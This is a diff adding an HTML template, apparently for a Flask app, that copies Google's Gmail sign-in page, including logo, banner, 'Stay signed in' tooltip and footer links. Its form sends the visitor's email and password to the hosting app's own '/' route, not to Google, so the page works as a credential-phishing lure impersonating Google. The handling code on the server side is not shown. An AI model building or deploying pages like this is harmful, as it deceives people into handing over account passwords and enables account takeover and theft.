@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <meta charset="utf-8">
+      <meta content="width=300, initial-scale=1" name="viewport">
+      <meta name="description" content=".">
+      <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}"/>
+      <title>Sign in - Google Accounts</title>
+      <link rel="stylesheet" type="text/css" href="static/main.css">
+   </head>
+   <body>
+      <div class="wrapper">
+         <div class="google-header-bar  centered">
+            <div class="header content clearfix">
+               <img alt="Google" class="logo" src="{{ url_for('static', filename='google.png') }}">
+            </div>
+         </div>
+         <div class="main content clearfix">
+            <div class="banner">
+               <h1>
+                  One account. All of Google.
+               </h1>
+               <h2 class="hidden-small">
+                  Sign in to continue to Gmail
+               </h2>
+            </div>
+            <div class="card signin-card clearfix">
+               <img class="profile-img" src="{{ url_for('static', filename='avatar.png') }}">
+               <p class="profile-name"></p>
+               <form method="post" action="/">
+                  <label class="hidden-label" for="Email">Email</label>
+                  <input id="Email" name="email" type="email" placeholder="Email" required="" spellcheck="false">
+                  <label class="hidden-label" for="Passwd">Password</label>
+                  <input id="Passwd" name="password" required="" type="password" placeholder="Password">
+                  <input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
+                  <label class="remember">
+                     <input type="checkbox" value="yes" checked="checked">
+                     <span>
+                     Stay signed in
+                     </span>
+                     <div class="bubble-wrap" role="tooltip">
+                        <div class="bubble-pointer"></div>
+                        <div class="bubble">
+                           For your protection, keep this checked only on devices you use regularly.
+                           <a href="https://support.google.com/accounts/?p=securesignin&hl=en" target="_blank">Learn more</a>
+                        </div>
+                     </div>
+                  </label>
+                  <input type="hidden" name="rmShown" value="1">
+                  <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F" class="need-help-reverse">
+                  Need help?
+                  </a>
+               </form>
+            </div>
+            <div class="one-google">
+               <p class="create-account">
+                  <a id="link-signup" href="https://accounts.google.com/SignUp?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&hl=en">
+                  Create an account
+                  </a>
+               </p>
+               <p class="tagline">
+                  One Google Account for everything Google
+               </p>
+               <img src="{{ url_for('static', filename='logo_strip_2x.png') }}" width="210" height="17" alt="">
+            </div>
+         </div>
+         <div class="google-footer-bar">
+            <div class="footer content clearfix">
+               <ul id="footer-list">
+                  <li>
+                     <a href="https://google.com/" target="_blank">
+                     Google
+                     </a>
+                  </li>
+                  <li>
+                     <a href="https://accounts.google.com/TOS?loc=PH&hl=en" target="_blank">
+                     Privacy &amp; Terms
+                     </a>
+                  </li>
+                  <li>
+                     <a href="http://www.google.com/support/accounts?hl=en" target="_blank">
+                     Help
+                     </a>
+                  </li>
+               </ul>
+            </div>
+         </div>
+      </div>
+   </body>
+</html>
